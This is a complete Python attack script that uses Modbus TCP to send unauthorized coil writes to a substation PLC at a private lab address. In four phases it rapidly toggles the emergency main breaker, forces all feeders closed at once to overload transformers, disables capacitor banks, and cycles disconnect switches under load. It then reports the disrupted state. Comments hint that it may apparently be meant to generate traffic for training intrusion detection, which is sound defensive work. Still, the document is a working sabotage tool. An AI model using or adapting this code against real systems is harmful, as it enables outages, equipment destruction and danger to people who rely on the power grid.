#!/usr/bin/env python3
"""
Distribution Substation Attack - Unauthorized Coil Manipulation

Attack Objectives:
1. Rapidly toggle emergency main breaker (coil 99) to cause grid instability
2. Force all distribution feeders CLOSED simultaneously (overload condition)
3. Disable capacitor banks during high load (power quality attack)
4. Rapid successive writes with no operational delays (automation signature)
"""
from pymodbus.client import ModbusTcpClient
import time
import sys

PLC_IP = "192.168.20.20"
PLC_PORT = 502

def main():
  print("=" * 70)
  print("  [!] MALICIOUS MODBUS ATTACK - SUBSTATION DISRUPTION")
  print("=" * 70)
  print(f"[!] ATTACK: Targeting PLC at {PLC_IP}:{PLC_PORT}")

  client = ModbusTcpClient(PLC_IP, port=PLC_PORT)

  if not client.connect():
	  print("[!] Failed to connect to PLC")
	  sys.exit(1)

  print("[!] ATTACK: Connected to substation controller")
  print()

  # ATTACK PHASE 1: Emergency Main Breaker Rapid Toggling
  # This creates grid instability and potential equipment damage
  print("[!] ATTACK PHASE 1: Rapidly toggling emergency main breaker (coil 99)...")
  print("[!] Impact: Grid instability, potential cascade failures")
  for i in range(10):
	  # Trip main breaker
	  result = client.write_coil(address=99, value=True, slave=1)
	  if not result.isError():
		  print(f"[!] Iteration {i+1}: Emergency main breaker TRIPPED")

	  time.sleep(0.3)  # Minimal delay (contrast with 2-second baseline)

	  # Reset main breaker
	  result = client.write_coil(address=99, value=False, slave=1)
	  if not result.isError():
		  print(f"[!] Iteration {i+1}: Emergency main breaker RESET")

	  time.sleep(0.3)

  print()

  # ATTACK PHASE 2: Simultaneous Feeder Energization (Overload Attack)
  # Closing all feeders simultaneously creates dangerous overload condition
  print("[!] ATTACK PHASE 2: Forcing all distribution feeders CLOSED simultaneously...")
  print("[!] Impact: Transformer overload, potential equipment damage")
  result = client.write_coils(address=0, values=[True]*10, slave=1)
  if not result.isError():
	  print("[!] All 10 distribution feeder breakers forced CLOSED")
	  print("[!] WARNING: Simultaneous energization - overload condition created")
  else:
	  print(f"[!] Error during mass write: {result}")

  time.sleep(1)

  # ATTACK PHASE 3: Capacitor Bank Disruption
  # Disabling capacitor banks during high load degrades power quality
  print()
  print("[!] ATTACK PHASE 3: Disabling capacitor banks during high load...")
  print("[!] Impact: Power factor degradation, voltage instability")
  result = client.write_coils(address=10, values=[False]*5, slave=1)
  if not result.isError():
	  print("[!] All 5 capacitor banks forced OFFLINE")
	  print("[!] Power quality management systems disabled")
  else:
	  print(f"[!] Error during capacitor write: {result}")

  time.sleep(1)

  # ATTACK PHASE 4: Rapid Disconnect Switch Manipulation
  # Rapidly cycling disconnect switches under load creates arcing/damage
  print()
  print("[!] ATTACK PHASE 4: Rapidly cycling disconnect switches...")
  print("[!] Impact: Equipment damage from switching under load")
  for i in range(5):
	  result = client.write_coils(address=20, values=[True]*10, slave=1)
	  print(f"[!] Iteration {i+1}: All disconnect switches CLOSED")
	  time.sleep(0.2)

	  result = client.write_coils(address=20, values=[False]*10, slave=1)
	  print(f"[!] Iteration {i+1}: All disconnect switches OPENED")
	  time.sleep(0.2)

  # ATTACK COMPLETE: Verify final malicious state
  print()
  print("[!] ATTACK COMPLETE - Verifying final system state...")

  result = client.read_coils(address=0, count=10, slave=1)
  if not result.isError():
	  breaker_states = result.bits[:10]
	  print("[!] Final feeder breaker positions:")
	  for i, state in enumerate(breaker_states):
		  status = "CLOSED (ENERGIZED)" if state else "OPEN"
		  print(f"    Feeder {i+1}: {status}")

  result = client.read_coils(address=99, count=1, slave=1)
  if not result.isError():
	  emergency_state = result.bits[0]
	  status = "TRIPPED" if emergency_state else "NORMAL"
	  print(f"[!] Emergency main breaker: {status}")

  client.close()
  print()
  print("=" * 70)
  print("  [!] ATTACK COMPLETE - SUBSTATION OPERATIONS DISRUPTED")
  print("=" * 70)
  print()
  print("[*] Attack Summary:")
  print("    - Emergency breaker toggled 10 times (grid instability)")
  print("    - All feeders energized simultaneously (overload)")
  print("    - Capacitor banks disabled (power quality degradation)")
  print("    - Disconnect switches rapidly cycled (equipment damage)")

if __name__ == "__main__":
  main()
